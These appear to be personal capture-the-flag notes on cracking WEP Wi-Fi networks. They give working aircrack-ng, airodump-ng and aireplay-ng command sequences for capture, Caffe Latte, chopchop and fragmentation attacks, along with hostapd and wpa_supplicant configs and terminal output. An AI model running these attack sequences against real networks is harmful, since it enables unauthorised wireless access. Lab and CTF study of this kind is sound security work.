## Classic WEP

Basically run airodump for 10 minutes and aircrack

```
sudo airmon-ng

sudo airmon-ng start wlan27

sudo airodump-ng  -w derp --output-format pcap --band ag wlan27mon

wget https://raw.githubusercontent.com/rfhs/wctf-files/master/wordlist/cyberpunk.words

sudo aircrack-ng -w cyberpunk.words derp0-01.cap
```

## Caffe Latte (WEP, no AP)

How to recognize?
You might find in airodump-ng that there are probes to ESSIDs that aren't found.
This signals a client-side attack


Begin the Caffe Latte Attack by starting an airodump-ng capture and writing the keystream to an output file:
It helps to know the channel, which is more of an art and needs tweaking by playing with airodump to find what the target is looking for.

```
airodump-ng -w cafefile --output-format pcap --band a -c 44 wlan29mon
```

While an airodump-ng capture is running, perform the Caffe-Latte Attack:

to specify the channel, the interface needs to be brought up in airodump with channel specified.

```
aireplay-ng --caffe-latte -h 02:00:00:00:1E:00 -b 00:13:10:30:24:9C -D wlan30mon

    -h is our card MAC address
    -b is the Access Point MAC (any valid MAC should work)
    -D disables AP detection.
```

find our own mac with `iw dev`

^ This didn't work for me at DefCon 2020

According to another member used hostapd instead of aireplay

```
interface=wlan31mon
ssid=WCTF_03
channel=44
hw_mode=a
#mana_wpaout=hostapd.hccapx
wep_default_key=1
wep_key1="abcde"
wep_key_len_broadcast="5"
wep_key_len_unicast="5"
wep_rekey_period=300
auth_algs=3
```

put that into my_ha.conf

hostapd my_ha.conf starts the beacon and the original airodump will capture enough IVs for aircrack



## Client-less WEP

Attempts at "chochop/fragmentation"

```
aireplay-ng -1 0 -e WCTF_02 -a 00:DC:63:ED:5D:00 -h 02:00:00:00:1e:00 wlan30mon

aireplay-ng -5 -b 00:DC:63:ED:5D:00 -h 02:00:00:00:1e:00 wlan30mon

aireplay-ng -4 -b 00:DC:63:ED:5D:00 -h 02:00:00:00:1e:00 wlan30mon

aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b 00:DC:63:ED:5D:00 -h 02:00:00:00:1e:00 wlan30mon

aireplay-ng -1 1000 -o 1 -q 10 -e WCTF_02 -a 00:DC:63:ED:5D:00 -h 02:00:00:00:1e:00 wlan30mon
```

😬 The way Ted did it for RFHS_RFCTF_02:
aireplay -4 running on wlan28
sup running on 27 with a bs key
you can ignore the steps after -4 runs(edited)
i just cracked it with that small amount of data
i never got the inject to work

supplicant:
```
┌──(root💀efa43d97627c)-[~/rf]
└─# cat sups.conf 
network={
        ssid="RFHS_RFCTF_02"
        key_mgmt=NONE
        wep_key0="12345"
        wep_tx_keyidx=0
}

┌──(root💀efa43d97627c)-[~/rf]
└─# wpa_supplicant -i wlan31 -c sups.conf 
Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information
wlan31: SME: Trying to authenticate with 00:dc:63:ed:5d:00 (SSID='RFHS_RFCTF_02' freq=5220 MHz)
nl80211: kernel reports: key not allowed
wlan31: Trying to associate with 00:dc:63:ed:5d:00 (SSID='RFHS_RFCTF_02' freq=5220 MHz)
wlan31: Associated with 00:dc:63:ed:5d:00
wlan31: CTRL-EVENT-CONNECTED - Connection to 00:dc:63:ed:5d:00 completed [id=0 id_str=]
wlan31: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
^Cnl80211: deinit ifname=p2p-dev-wlan31 disabled_11b_rates=0
p2p-dev-wlan31: CTRL-EVENT-TERMINATING 
wlan31: CTRL-EVENT-DISCONNECTED bssid=00:dc:63:ed:5d:00 reason=3 locally_generated=1
nl80211: Failed to open /proc/sys/net/ipv4/conf/wlan31/drop_unicast_in_l2_multicast: Read-only file system
nl80211: Failed to set IPv4 unicast in multicast filter
nl80211: Failed to open /proc/sys/net/ipv4/conf/wlan31/drop_unicast_in_l2_multicast: Read-only file system
nl80211: Failed to set IPv4 unicast in multicast filter
nl80211: Failed to open /proc/sys/net/ipv4/conf/wlan31/drop_unicast_in_l2_multicast: Read-only file system
nl80211: Failed to set IPv4 unicast in multicast filter
nl80211: deinit ifname=wlan31 disabled_11b_rates=0
wlan31: CTRL-EVENT-TERMINATING 
```

Might not even need the `-4` step. It seems the supplicant forces the AP to make enough data to capture w/ airodump??
